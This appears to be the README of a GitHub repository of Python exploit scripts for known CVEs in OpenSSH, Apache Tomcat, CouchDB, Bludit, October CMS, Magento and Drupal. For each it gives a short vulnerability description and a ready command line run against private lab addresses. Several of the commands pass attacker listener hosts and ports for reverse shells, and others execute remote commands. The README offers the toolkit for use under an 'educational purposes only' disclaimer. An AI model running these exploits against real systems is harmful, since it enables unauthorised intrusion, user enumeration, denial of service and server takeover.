# vulnexipy

**Vulnerabilities exploitation examples**

## Examples

1. clone the repository

```bash
git clone https://github.com/cocomelonc/vulnexipy
```

2. go to the dir:
```bash
cd vulnexipy
```

3. run python exploit, for example:
```bash
python3 cve_2009_3548.py -u http://172.16.64.101:8080/ -U tomcat -P s3cret -i 172.16.64.10 -p 4444
```

CVE-2016-6210 - sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses BLOWFISH hashing on a static password when the username does not exist, which allows remote attackers to enumerate users by leveraging the timing difference between responses when a large password is provided.

```bash
python cve_2016_6210.py --target 10.10.6.17 --usernames users.txt
```
CVE-2016-6515 - The auth_password function in auth-passwd.c in sshd in OpenSSH before 7.3 does not limit password lengths for password authentication, which allows remote attackers to cause a denial of service (crypt CPU consumption) via a long string. 

```bash
python cve_2016_6515.py --target 10.10.6.13 --username root
```

CVE-2017-12635 - Apache CouchDB before 1.7.0 and 2.x before 2.1.1 to submit '_users' documents with duplicate keys for 'roles' used for access control within the database, including the special case '_admin' role, that denotes administrative users.
```bash
python cve_2017_12635 --target 10.10.6.14 -u couchdb -p mysuperpswd
```

CVE-2019-16113 - Bludit 3.9.2 allows remote code execution via bl-kernel/ajax/upload-images.php because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname.

```bash
python cve_2019_16113.py --url 10.10.6.15 --username admin --password admin --cmd whoami
```

CVE-2017-1000119 - October CMS build 412 is vulnerable to PHP code execution in the file upload functionality resulting in site compromise and possibly other applications on the server.

```bash
python cve_2017_1000119.py --url http://10.10.6.16 -user admin -pswd admin -lhost 10.10.14.16 -lport 4444
```

Magento Community Edition < 1.9.0.1 - Authenticated Remote Code Execution
```bash
python magento_auth_rce.py --url http://10.10.10.112 --user admin --pswd admin
```

CVE-2018-7600 - Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.
```bash
python cve_2018_7600.py --url http://10.10.10.151 --cmd whoami
```

**This tool is a Proof of Concept and is for Educational Purposes Only!!!**
**Author takes no responsibility of any damage you cause**
